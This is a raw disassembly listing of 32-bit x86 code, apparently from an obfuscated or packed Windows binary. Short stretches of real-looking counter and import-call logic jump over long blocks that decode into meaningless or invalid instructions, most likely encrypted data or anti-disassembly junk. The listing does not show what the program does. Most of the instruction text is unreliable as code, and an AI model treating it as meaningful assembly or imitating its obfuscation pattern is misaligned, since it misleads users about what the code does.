  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	jp     0x4069c8
  40695d:	mov    esi,0x78c900d8
  406962:	js     0x4069c8
  406964:	jle    0x4069de
  406966:	js     0x40694e
  406968:	ret    
  406969:	sub    DWORD PTR [ebx+eax*2+0x6e1725b1],edi
  406970:	out    dx,eax
  406971:	cmp    DWORD PTR [esi+edx*1+0x46],ecx
  406975:	xor    al,dl
  406977:	mov    BYTE PTR [eax-0x2e86dfcc],dh
  40697d:	xor    al,0x14
  406980:	ins    DWORD PTR es:[edi],dx
  406981:	int    0x99
  406983:	xor    al,0xfc
  406985:	aam    0x48
  406987:	fadd   DWORD PTR [ecx-0x63]
  40698a:	mov    esi,0xa3a81ae0
  40698f:	cmp    al,BYTE PTR [eax+0x50bab3ea]
  406995:	lock out dx,eax
  406997:	sar    BYTE PTR [edi],1
  406999:	jno    0x406932
  40699b:	in     eax,0x3e
  40699d:	retf   
  40699e:	popf   
  40699f:	lods   al,BYTE PTR ds:[esi]
  4069a0:	call   DWORD PTR [ebx-0xa070a7a]
  4069a6:	cmp    bl,BYTE PTR [edx]
  4069a8:	cmp    BYTE PTR [esi],dl
  4069aa:	cmp    DWORD PTR [edi],ecx
  4069ac:	xchg   ecx,eax
  4069ad:	jo     0x4069a9
  4069af:	out    dx,eax
  4069b0:	rcl    BYTE PTR [ebp-0x3f],cl
  4069b3:	mov    cl,0xe2
  4069b5:	sbb    edi,DWORD PTR [ebx]
  4069b7:	fistp  WORD PTR [esp+eiz*2+0x800dc8b]
  4069be:	adc    edx,DWORD PTR ds:0x975b8ed0
  4069c4:	shr    DWORD PTR [ebx],1
  4069c6:	lea    edx,[esi]
  4069c8:	cmp    cl,BYTE PTR [ebp+0x1c]
  4069cb:	pusha  
  4069cc:	cwde   
  4069cd:	xchg   ebx,eax
  4069ce:	in     eax,dx
  4069cf:	xchg   DWORD PTR [ebx],esp
  4069d1:	test   DWORD PTR [ebp-0x5e66a7f3],edi
  4069d7:	jge    0x406969
  4069d9:	sbb    DWORD PTR [eax-0x5b],eax
  4069dc:	mov    dl,0xdd
  4069de:	push   0xffffff95
  4069e0:	cs out 0x1f,eax
  4069e3:	aam    0xfa
  4069e5:	cmp    eax,0x18b7edb9
  4069ea:	cs mov bl,0xf
  4069ed:	lock idiv dh
  4069f0:	pop    edi
  4069f1:	(bad)  
  4069f2:	or     dl,BYTE PTR [esi+0x231db0f2]
  4069f8:	lahf   
  4069f9:	aam    0xd8
  4069fb:	jbe    0x4069e8
  4069fd:	popa   
  4069fe:	shl    eax,1
  406a00:	fcomp  DWORD PTR [ebx-0x5210839d]
  406a06:	xchg   ebp,eax
  406a07:	into   
  406a08:	pop    ds
  406a09:	iret   
  406a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a0b:	xchg   esi,eax
  406a0c:	dec    ecx
  406a0e:	jne    0x406a45
  406a10:	xchg   esi,eax
  406a11:	(bad)  
  406a12:	(bad)  
  406a13:	cli    
  406a14:	xchg   ebx,eax
  406a15:	push   ss
  406a16:	xchg   ebx,eax
  406a17:	popf   
  406a18:	jp     0x406a46
  406a1a:	cmp    DWORD PTR [ebx+0x32b8218f],edi
  406a20:	mov    dl,0xad
  406a22:	retf   
  406a23:	fucomp st(6)
  406a25:	imul   eax,DWORD PTR [edx-0x3409f64b],0x7dc2a598
  406a2f:	into   
  406a30:	push   ebp
  406a31:	fisttp DWORD PTR [eax]
  406a33:	push   esi
  406a34:	rcr    DWORD PTR [eax-0x40],0xf7
  406a38:	pop    ds
  406a39:	fnstsw WORD PTR [esi+0x26b35fe6]
  406a3f:	jl     0x406a38
  406a41:	icebp  
  406a42:	add    eax,0x5c1cf6a2
  406a47:	xor    al,0xe1
  406a49:	sub    eax,0x9ca3e794
  406a4e:	mov    si,WORD PTR [ebx-0x74c43ee4]
  406a55:	into   
  406a56:	push   ss
  406a57:	cmp    dl,BYTE PTR [eax-0x14a48ac6]
  406a5d:	retf   0xe4f3
  406a60:	inc    esp
  406a61:	test   ecx,ecx
  406a63:	fimul  WORD PTR [ebx-0x3a]
  406a66:	arpl   WORD PTR [edi+0x42],dx
  406a69:	out    dx,al
  406a6a:	out    dx,al
  406a6b:	mov    dh,0x7c
  406a6d:	aam    0xfe
  406a6f:	xor    DWORD PTR [edi-0x35cc8a17],ecx
  406a75:	inc    edx
  406a76:	jge    0x406a3d
  406a78:	sub    esp,edi
  406a7a:	xchg   esp,eax
  406a7b:	(bad)  
  406a7c:	cmc    
  406a7d:	mov    al,ds:0x8256db60
  406a82:	cmp    esi,edx
  406a84:	sub    BYTE PTR [ebp-0x6bf148da],ch
  406a8a:	outs   dx,DWORD PTR ds:[esi]
  406a8b:	inc    esp
  406a8c:	sub    al,0x74
  406a8e:	fwait
  406a8f:	es clc 
  406a91:	or     eax,0xfc9f1189
  406a96:	sub    BYTE PTR [ebx-0x6336b35c],bh
  406a9c:	cmc    
  406a9d:	(bad)  
  406a9e:	mov    edx,DWORD PTR [ecx+0x5e42e0ed]
  406aa4:	bound  ecx,QWORD PTR [edx+0x2f162f3]
  406aaa:	push   ebx
  406aab:	std    
  406aac:	adc    eax,0x7b9ca92c
  406ab1:	mov    al,ds:0x7ba9311e
  406ab6:	or     eax,0x6b2f99ff
  406abb:	add    al,0x62
  406abd:	je     0x406af4
  406abf:	mov    eax,0xe12dcd99
  406ac4:	out    0x87,eax
  406ac6:	pusha  
  406ac7:	push   ds
  406ac8:	fs repz aas 
  406acb:	or     BYTE PTR [esi-0x3019c9bb],dh
  406ad1:	mov    edx,0x83df2ec9
  406ad6:	fsub   QWORD PTR [edi-0x5728269e]
  406adc:	jae    0x406ac9
  406ade:	cld    
  406adf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ae0:	mov    bh,0x27
  406ae2:	stos   DWORD PTR es:[edi],eax
  406ae3:	ja     0x406aef
  406ae5:	inc    esp
  406ae6:	xor    bl,ah
  406ae8:	cli    
  406ae9:	jmp    0x205ecced
  406aee:	loope  0x406aad
  406af0:	dec    ebx
  406af1:	arpl   WORD PTR [esp+ebx*8+0x7def33c0],sp
  406af8:	ror    DWORD PTR [ecx-0x42],0x9f
  406afc:	imul   esi,DWORD PTR [edx+ebp*2-0x47],0x9806f127
  406b04:	pop    ds
  406b05:	pop    ebx
  406b06:	js     0x406b76
  406b08:	mov    dl,0xf
  406b0a:	arpl   WORD PTR [ebp-0x5b],cx
  406b0d:	mov    cs,WORD PTR [ecx+0x2dbf81c6]
  406b13:	lea    edi,[esi-0x6d]
  406b16:	fisub  DWORD PTR [ebx+0x79]
  406b19:	mov    edx,0x96b0999a
  406b1e:	enter  0xe6b4,0x3b
  406b22:	out    0xa3,eax
  406b24:	cmp    dh,BYTE PTR [edi+0x17427922]
  406b2a:	sti    
  406b2b:	adc    edi,esp
  406b2d:	in     eax,dx
  406b2e:	das    
  406b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b30:	ficomp DWORD PTR [edx-0x60a89970]
  406b36:	fdiv   DWORD PTR [edi]
  406b38:	aad    0x50
  406b3a:	adc    eax,0x2c151f52
  406b3f:	or     dl,BYTE PTR [ebx-0x3c]
  406b42:	mov    ebp,esi
  406b44:	mov    al,0xd8
  406b46:	call   0xd1c5:0xf7f4886d
  406b4d:	imul   ecx,DWORD PTR [ebp-0x3b97df4a],0xc1a8ecef
  406b57:	cmp    esi,ebp
  406b59:	mov    esi,0x18dd0748
  406b5e:	add    eax,0x89071c33
  406b63:	outs   dx,DWORD PTR ds:[esi]
  406b64:	inc    esi
  406b65:	inc    ebp
  406b66:	daa    
  406b67:	iret   
  406b68:	popf   
  406b69:	fwait
  406b6a:	jb     0x406b76
  406b6c:	xor    dl,BYTE PTR [ecx-0x1bc0530f]
  406b72:	imul   ebx,ebx,0xffffffe6
  406b75:	(bad)  
  406b76:	fcmovu st,st(5)
  406b78:	push   ecx
  406b79:	sti    
  406b7a:	das    
  406b7b:	and    dh,dh
  406b7d:	shr    BYTE PTR ds:0x6e5d62f6,cl
  406b83:	inc    ebx
  406b84:	fistp  DWORD PTR [edx]
  406b86:	sub    DWORD PTR [ebx-0x5e470eee],edx
  406b8c:	jmp    0x406bfb
  406b8e:	lods   al,BYTE PTR ds:[esi]
  406b8f:	push   edx
  406b90:	mov    BYTE PTR [ecx+0x21a9d7cf],bh
  406b96:	mov    edi,0x58edb7
  406b9b:	lock ins DWORD PTR es:[edi],dx
  406b9d:	mov    ch,BYTE PTR [edx-0x23b88df2]
  406ba3:	jbe    0x406bae
  406ba5:	js     0x406b8e
  406ba7:	jns    0x406bfb
  406ba9:	enter  0x7398,0x33
  406bad:	jo     0x406bab
  406baf:	ss lock mul eax
  406bb3:	jnp    0x406b3a
  406bb5:	or     BYTE PTR [eax+0x2f],0xf3
  406bb9:	sbb    edx,DWORD PTR [ecx+0x47]
  406bbc:	loop   0x406b74
  406bbe:	and    DWORD PTR [edi-0x707596b6],eax
  406bc4:	and    al,0x66
  406bc6:	push   ebp
  406bc7:	arpl   WORD PTR [edx-0x52aa560f],dx
  406bcd:	jmp    0x686603b9
  406bd2:	std    
  406bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd4:	fstp   DWORD PTR [ebp+0x58]
  406bd7:	push   ebx
  406bd8:	push   0x58eb4f56
  406bdd:	add    eax,0x94ef122d
  406be2:	arpl   WORD PTR [eax-0x79],sp
  406be5:	ficomp DWORD PTR [edi+0x1f]
  406be8:	pop    eax
  406be9:	sub    DWORD PTR [eax+0x66b5f8ca],ebx
  406bef:	es stos BYTE PTR es:[edi],al
  406bf1:	aad    0x44
  406bf3:	test   DWORD PTR [eax+0x79],esp
  406bf6:	push   0xfffffff0
  406bf8:	pop    esi
  406bf9:	push   esp
  406bfa:	ret    0xe034
  406bfd:	jl     0x406bb7
  406bff:	(bad)
  406c03:	mov    ds:0x7707bf87,eax
  406c08:	mov    ebx,eax
  406c0a:	push   eax
  406c0b:	pop    ecx
  406c0c:	add    BYTE PTR [ecx],cl
  406c0e:	sub    DWORD PTR [eax-0x1bfb048d],0x8a86e737
  406c18:	data16 xor BYTE PTR [esi+0x68],cl
  406c1c:	jno    0x406bc6
  406c1e:	pop    eax
  406c1f:	xchg   edx,eax
  406c20:	mov    dl,0xdc
  406c22:	lods   eax,DWORD PTR ds:[esi]
  406c23:	dec    ebp
  406c24:	pusha  
  406c25:	fstp   DWORD PTR [ecx+0x16]
  406c28:	add    DWORD PTR [edx-0x34],ebp
  406c2b:	push   edi
  406c2c:	xchg   DWORD PTR [edx],esp
  406c2e:	inc    edi
  406c2f:	arpl   WORD PTR [ebx+0x531b16ac],si
  406c35:	out    0x42,eax
  406c37:	lods   al,BYTE PTR ds:[esi]
  406c38:	xor    ebx,edi
  406c3a:	int    0xff
  406c3c:	lahf   
  406c3d:	out    0x92,eax
  406c3f:	mov    eax,?
  406c41:	inc    BYTE PTR [esi+0x1a]
  406c44:	jno    0x406c95
  406c46:	pop    ebx
  406c47:	dec    ecx
  406c48:	ins    BYTE PTR es:[edi],dx
  406c49:	add    eax,0x1cdd0b41
  406c4e:	sbb    BYTE PTR [ebx],al
  406c50:	hlt    
  406c51:	pop    eax
  406c52:	aad    0xb8
  406c54:	mov    al,BYTE PTR ss:[eax]
  406c57:	add    BYTE PTR [ecx+0x42a7c915],al
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx+0x60],ebx
  406c91:	pusha  
  406c92:	dec    eax
  406c93:	xlat   BYTE PTR ds:[ebx]
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cb6
  406c9d:	(bad)  
  406ca0:	jmp    0x90c0:0x6afe367f
  406ca7:	jb     0x406c96
  406ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406caa:	mov    dl,ch
  406cac:	ja     0x406cbd
  406cae:	inc    esp
  406caf:	out    dx,eax
  406cb0:	aad    0x6f
  406cb2:	push   ds
  406cb3:	xor    cl,BYTE PTR [edi-0x57]
  406cb6:	rcr    DWORD PTR [ebx],1
  406cb8:	or     cl,0xa9
  406cbb:	ror    ebx,0xc1
  406cbe:	and    al,0x36
  406cc0:	jge    0x406ceb
  406cc2:	push   0xffffff9a
  406cc4:	jecxz  0x406d1c
  406cc6:	jbe    0x406d2c
  406cc8:	adc    ch,BYTE PTR ds:0xc4fca855
  406cce:	push   ebx
  406ccf:	push   edi
  406cd0:	xchg   esp,eax
  406cd1:	aam    0xf1
  406cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd4:	push   es
  406cd5:	inc    ebp
  406cd6:	push   ebp
  406cd7:	sub    al,0x8
  406cd9:	daa    
  406cda:	les    esp,FWORD PTR [edx]
  406cdc:	adc    eax,0xa1908855
  406ce1:	jecxz  0x406d00
  406ce3:	or     DWORD PTR [edi-0x70169ba5],0xffffff80
  406cea:	out    dx,al
  406ceb:	ror    esi,0x98
  406cee:	ffree  st(2)
  406cf0:	jmp    0xf38:0x411c6d1b
  406cf7:	imul   eax,DWORD PTR [ebp+ebx*4-0x4c65140d],0x592ed631
  406d02:	xor    ch,BYTE PTR [edx+0x237ffa83]
  406d08:	(bad)  
  406d09:	ror    BYTE PTR [ebx-0x72],0x60
  406d0d:	out    0x9e,eax
  406d0f:	jmp    0x1ecd:0x4e942fa8
  406d16:	lea    edi,[ebx]
  406d18:	repz xor BYTE PTR [ebp+0x32],bh
  406d1c:	fmul   QWORD PTR [ebx]
  406d1e:	dec    eax
  406d1f:	push   esi
  406d20:	push   cs
  406d21:	sbb    eax,0xd6fc4dfa
  406d26:	out    0xb6,al
  406d28:	std    
  406d29:	mov    al,0xf7
  406d2b:	inc    ebp
  406d2c:	adc    BYTE PTR [edi-0x49],0x4f
  406d30:	xor    eax,0x20ceee34
  406d35:	out    0xa,al
  406d37:	and    DWORD PTR [edi+0x69],0xb7dbdb61
  406d3e:	jne    0x406d16
  406d40:	dec    edi
  406d41:	jno    0x406db2
  406d43:	mov    esi,DWORD PTR [ecx+edi*8]
  406d46:	stos   BYTE PTR es:[edi],al
  406d47:	or     al,0xe9
  406d49:	xchg   ebp,eax
  406d4a:	and    BYTE PTR [edx],dl
  406d4c:	mov    ds,WORD PTR [edi+0x29]
  406d4f:	cmp    edx,ebx
  406d51:	jecxz  0x406cfd
  406d53:	inc    esi
  406d54:	mov    ah,0xaa
  406d56:	xchg   edi,eax
  406d57:	call   0xf80a:0x22f3b13a
  406d5e:	retf   0xa310
  406d61:	(bad)  
  406d62:	shl    ah,0x8f
  406d65:	arpl   bx,dx
  406d67:	icebp  
  406d68:	xlat   BYTE PTR ds:[ebx]
  406d69:	pop    ds
  406d6a:	pop    edx
  406d6b:	imul   eax,DWORD PTR [edi],0xe2813c05
  406d71:	push   ds
  406d72:	xor    ecx,DWORD PTR [ebp-0x4934be2b]
  406d78:	repnz and al,0x27
  406d7b:	cmp    dl,ah
  406d7d:	pushf  
  406d7e:	fistp  DWORD PTR [ebx+edi*4+0x71]
  406d82:	addr16 dec edx
  406d84:	or     bh,bl
  406d86:	sub    ch,BYTE PTR [ebp+eax*1+0x5c]
  406d8a:	push   ecx
  406d8b:	dec    esp
  406d8c:	lea    eax,[ebp-0x5822ebd1]
  406d92:	mov    eax,ss:0x53649b4d
  406d98:	leave  
  406d99:	fcmovbe st,st(0)
  406d9b:	pop    ecx
  406d9c:	js     0x406d63
  406d9e:	iret   
  406d9f:	fcomip st,st(2)
  406da1:	loopne 0x406d95
  406da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da4:	xor    ecx,esp
  406da6:	mov    eax,0xec1d28d7
  406dab:	pop    eax
  406dac:	fucomip st,st(2)
  406dae:	inc    esi
  406daf:	jl     0x406d80
  406db1:	into   
  406db2:	inc    eax
  406db3:	(bad)  
  406db4:	(bad)  
  406db5:	cmc    
  406db6:	mov    ecx,0x31eca632
  406dbb:	mov    dh,0x7b
  406dbd:	mov    esp,0x111699d2
  406dc2:	push   es
  406dc3:	cwde   
  406dc4:	inc    ebx
  406dc5:	jmp    0x6fdb4c07
  406dca:	ins    BYTE PTR es:[edi],dx
  406dcb:	inc    ebx
  406dcc:	adc    BYTE PTR [ebx-0x5e],bl
  406dcf:	out    0x7a,eax
  406dd1:	push   0x4ba37b2
  406dd6:	or     al,0x5b
  406dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd9:	jae    0x406dcc
  406ddb:	adc    BYTE PTR [ebx],al
  406ddd:	adc    bh,cl
  406ddf:	jle    0x406dbd
  406de1:	pushf  
  406de2:	pop    es
  406de3:	add    al,0xd0
  406de5:	fadd   QWORD PTR [esi+edx*2+0x5304fbdc]
  406dec:	adc    eax,0x6fa18311
  406df1:	fld    TBYTE PTR [esi]
  406df3:	pop    ecx
  406df4:	mov    ebx,0x93682c7e
  406df9:	cwde   
  406dfa:	or     edi,esp
  406dfc:	stos   BYTE PTR es:[edi],al
  406dfd:	jge    0x406da7
  406dff:	xor    ecx,DWORD PTR [ebx]
  406e01:	(bad)  
  406e02:	sbb    al,0x28
  406e04:	mov    bh,0x82
  406e06:	repz pop ecx
  406e08:	mov    ss,WORD PTR [edi]
  406e0a:	pushf  
  406e0b:	xchg   ebp,eax
  406e0c:	mul    BYTE PTR [esi+0x53]
  406e0f:	mov    bh,0x8
  406e11:	cmp    al,0xc2
  406e13:	dec    edx
  406e14:	stc    
  406e15:	imul   ebp,edx,0xffffffe2
  406e18:	test   DWORD PTR [eax+0x1d],edi
  406e1b:	stos   DWORD PTR es:[edi],eax
  406e1c:	or     ah,BYTE PTR [ebx-0x73]
  406e1f:	lods   al,BYTE PTR ds:[esi]
  406e20:	fstp   QWORD PTR [ebp+0x7]
  406e23:	pop    es
  406e24:	jns    0x406e2f
  406e26:	adc    BYTE PTR [ebp-0x75057de9],dl
  406e2c:	aad    0xbc
  406e2e:	push   edi
  406e2f:	arpl   WORD PTR [ebx-0x3d],di
  406e32:	mov    al,ds:0xcd6333c4
  406e37:	sbb    eax,0x7317bd0f
  406e3c:	pop    ss
  406e3d:	shl    esi,cl
  406e3f:	mov    edx,0x1c0362d0
  406e44:	retf   0xe93a
  406e47:	pop    es
  406e48:	arpl   WORD PTR [ebx],dx
  406e4a:	inc    esi
  406e4b:	or     edx,DWORD PTR [edi-0x4bcf8356]
  406e51:	hlt    
  406e52:	icebp  
  406e53:	pop    eax
  406e54:	mov    dl,0x27
  406e56:	test   BYTE PTR [edi],dh
  406e58:	mov    edx,0x905a6da2
  406e5d:	pop    ss
  406e5e:	cmc    
  406e5f:	std    
  406e60:	pop    eax
  406e61:	lods   eax,DWORD PTR ds:[esi]
  406e62:	repz out dx,eax
  406e64:	in     al,0x44
  406e66:	pop    edi
  406e67:	lahf   
  406e68:	(bad)  [edx+0x75]
  406e6b:	mov    dh,cl
  406e6d:	sbb    DWORD PTR [ebp-0x7c9635cb],0xe9634b3c
  406e77:	cmc    
  406e78:	add    al,BYTE PTR ds:0x1f4bb104
  406e7e:	xchg   ebp,eax
  406e7f:	pusha  
  406e80:	out    0x3c,al
  406e82:	and    ebp,esi
  406e84:	jmp    DWORD PTR [edi]
  406e86:	jge    0x406e4d
  406e88:	xor    bl,cl
  406e8a:	mov    ds:0x53537d5d,al
  406e8f:	sar    BYTE PTR [esi+0x9b51452],cl
  406e95:	repnz sub edi,edi
  406e98:	or     ebp,DWORD PTR [eax+esi*8+0x2260d02d]
  406e9f:	aad    0x62
  406ea1:	sbb    DWORD PTR [edx],0x9104a27f
  406ea7:	pop    ds
  406ea8:	ror    DWORD PTR [ebp+0x11],1
  406eab:	(bad)  
  406eac:	stc    
  406ead:	fadd   QWORD PTR [ecx-0x57]
  406eb0:	ror    BYTE PTR [ebx+0x1ed52850],1
  406eb6:	rol    BYTE PTR [edx-0x34740c4f],0x72
  406ebd:	push   0x9
  406ebf:	popa   
  406ec0:	dec    edi
  406ec1:	mov    bl,0x8f
  406ec3:	push   esi
  406ec4:	outs   dx,BYTE PTR ds:[esi]
  406ec5:	mov    ebp,0x8324fd87
  406eca:	into   
  406ecb:	lods   al,BYTE PTR ds:[esi]
  406ecc:	mov    ebx,0x805d14c5
  406ed1:	and    edx,ebp
  406ed3:	adc    esp,DWORD PTR ds:0xf3c4f707
  406ed9:	sub    eax,0x785c26e5
  406ede:	shr    edi,cl
  406ee0:	xchg   DWORD PTR [edi-0x1d38ff94],esp
  406ee6:	(bad)  
  406ee7:	add    edx,edi
  406ee9:	pop    ss
  406eea:	loop   0x406ea8
  406eec:	imul   ecx,esp,0x851f540b
  406ef2:	icebp  
  406ef3:	rcl    BYTE PTR [ebp-0x26],cl
  406ef6:	jne    0x406f12
  406ef8:	out    dx,al
  406ef9:	stos   BYTE PTR es:[edi],al
  406efa:	xor    DWORD PTR [edi+0x25c655ec],esp
  406f00:	add    al,0xd2
  406f02:	jae    0x406f48
  406f04:	fmul   DWORD PTR [edi-0x23]
  406f07:	sar    DWORD PTR [ebx],0xec
  406f0a:	sub    eax,0xaca196dd
  406f0f:	mov    eax,ds:0xcd4cb165
  406f14:	push   eax
  406f15:	(bad)  
  406f17:	cmp    al,0x40
  406f19:	pop    ecx
  406f1a:	or     al,0xea
  406f1c:	retf   
  406f1d:	(bad)  
  406f1e:	sub    cl,BYTE PTR [ecx+ecx*8-0x78]
  406f22:	std    
  406f23:	push   ds
  406f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f25:	test   eax,0xabeb716
  406f2a:	ds out dx,eax
  406f2c:	rcr    eax,1
  406f2e:	sbb    DWORD PTR ds:0xccbca5b4,eax
  406f34:	mov    ecx,0x35d3f75d
  406f39:	inc    esi
  406f3a:	dec    edi
  406f3b:	jl     0x406f16
  406f3d:	dec    ecx
  406f3e:	ds xchg ecx,eax
  406f40:	hlt    
  406f41:	push   edx
  406f42:	jmp    0xedc8:0xa5bdd7f1
  406f49:	test   eax,0xb3e733e9
  406f4e:	les    edi,FWORD PTR [ecx-0xe7d0348]
  406f54:	xchg   esp,eax
  406f55:	jl     0x406fa9
  406f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f58:	jmp    FWORD PTR [eax+ebx*1+0x11fcad1c]
  406f5f:	fidiv  DWORD PTR [edi+0x7f11f60a]
  406f65:	fadd   DWORD PTR [ecx-0x37]
  406f68:	cld    
  406f69:	vaddpd ymm0,ymm3,ymm2
  406f6d:	scas   eax,DWORD PTR es:[edi]
  406f6e:	test   BYTE PTR [edx+esi*2+0x16],bl
  406f72:	jle    0x406f26
  406f74:	fadd   st,st(2)
  406f76:	iret   
  406f77:	lods   al,BYTE PTR ds:[esi]
  406f78:	xor    ch,BYTE PTR [esi+0x21a2af91]
  406f7e:	lea    ebp,[ebx-0x42]
  406f81:	data16 jl 0x406f2d
  406f84:	sahf   
  406f85:	stos   BYTE PTR es:[edi],al
  406f86:	into   
  406f87:	popf   
  406f88:	add    ax,cx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xb9,al
  40702c:	push   ds
  40702d:	push   ds
  40702e:	call   0x78b93c8b
  407033:	fs jle 0x4070ae
  407036:	js     0x4070b7
  407038:	clc    
  407039:	int3   
  40703a:	jecxz  0x407059
  40703c:	dec    BYTE PTR [edi]
  40703e:	mov    al,ds:0xde6183c
  407043:	ficomp WORD PTR [edi]
  407045:	daa    
  407046:	sub    eax,0x8f00d207
  40704b:	or     DWORD PTR [eax],edx
  40704d:	rcr    BYTE PTR [eax],1
  40704f:	pushf  
  407050:	iret   
  407051:	cld    
  407052:	sti    
  407053:	std    
  407054:	cmp    dh,BYTE PTR [ebp-0x3e]
  407057:	clc    
  407058:	mov    esi,0x631bd230
  40705d:	bound  ebp,QWORD PTR [edi+0x55]
  407060:	mov    ecx,0x9275d815
  407065:	jl     0x40706c
  407067:	add    eax,0xf1dd07d7
  40706c:	mov    edx,gs
  40706e:	mov    ds:0x2b00e8c1,al
  407073:	out    dx,al
  407074:	repnz das 
  407076:	push   edi
  407077:	jge    0x4070ad
  407079:	aaa    
  40707a:	cmc    
  40707b:	mov    ecx,0x659e6026
  407080:	and    edx,edi
  407082:	mov    edi,0xf1d88029
  407087:	jg     0x4070d1
  407089:	lock jecxz 0x40702a
  40708c:	call   0x947f:0x4dd722d2
  407093:	iret   
  407094:	cmp    cl,BYTE PTR [eax+ebp*1+0x7572bfc0]
  40709b:	jo     0x4070e2
  40709d:	ds popa 
  40709f:	ror    DWORD PTR [ecx-0x75b61e44],0x92
  4070a6:	loopne 0x4070e6
  4070a8:	dec    ebx
  4070a9:	mov    edx,0xbfa6f44
  4070ae:	jg     0x407058
  4070b0:	cmp    BYTE PTR [edi],0xd2
  4070b3:	dec    edi
  4070b4:	rol    ch,cl
  4070b6:	mov    ebx,0x421c25a
  4070bb:	xlat   BYTE PTR ds:[ebx]
  4070bc:	jae    0x4070bc
  4070be:	scas   eax,DWORD PTR es:[edi]
  4070bf:	addr16 nop
  4070c1:	bound  esp,QWORD PTR [edi+eax*8-0x79]
  4070c5:	dec    esi
  4070c6:	adc    eax,0xda58addb
  4070cb:	jmp    0xcb3f1a66
  4070d0:	inc    esp
  4070d2:	adc    al,0xcc
  4070d4:	sub    eax,0x23431363
  4070d9:	sub    bl,BYTE PTR [esi-0x78b01c39]
  4070df:	in     eax,dx
  4070e0:	xor    DWORD PTR [eax-0xbdb86bc],eax
  4070e6:	call   0xeff8:0x21f3a6
  4070ed:	stos   DWORD PTR es:[edi],eax
  4070ee:	pop    edx
  4070ef:	sar    BYTE PTR [eax],0xa0
  4070f2:	push   0x60
  4070f4:	cmp    DWORD PTR [esi+0x2d32b29c],esi
  4070fa:	pop    ebp
  4070fb:	jle    0x4070d9
  4070fd:	sbb    al,0x91
  4070ff:	pusha  
  407100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407102:	pusha  
  407103:	rcl    DWORD PTR [ebx+0x5d26f880],1
  407109:	xchg   ecx,eax
  40710a:	rcl    BYTE PTR ds:0xd3d89b9d,cl
  407110:	in     al,dx
  407111:	test   DWORD PTR [ecx+0x21],ecx
  407114:	outs   dx,DWORD PTR ds:[esi]
  407115:	inc    ebx
  407116:	test   eax,0xa67867ae
  40711b:	stos   DWORD PTR es:[edi],eax
  40711c:	(bad)  
  40711d:	pop    eax
  40711e:	pop    ecx
  40711f:	scas   eax,DWORD PTR es:[edi]
  407120:	ins    DWORD PTR es:[edi],dx
  407121:	enter  0x784d,0xc1
  407125:	cdq    
  407126:	int3   
  407127:	call   0xb00e:0xa565c66a
  40712e:	lds    ebp,FWORD PTR [ebx-0x24e67350]
  407134:	add    ch,cl
  407136:	arpl   WORD PTR [edx-0x50a20833],dx
  40713c:	mov    BYTE PTR [esi],0xcc
  40713f:	inc    edi
  407140:	dec    eax
  407141:	adc    DWORD PTR [eax+eax*2-0x78],ebx
  407145:	dec    ecx
  407146:	push   ds
  407147:	dec    edi
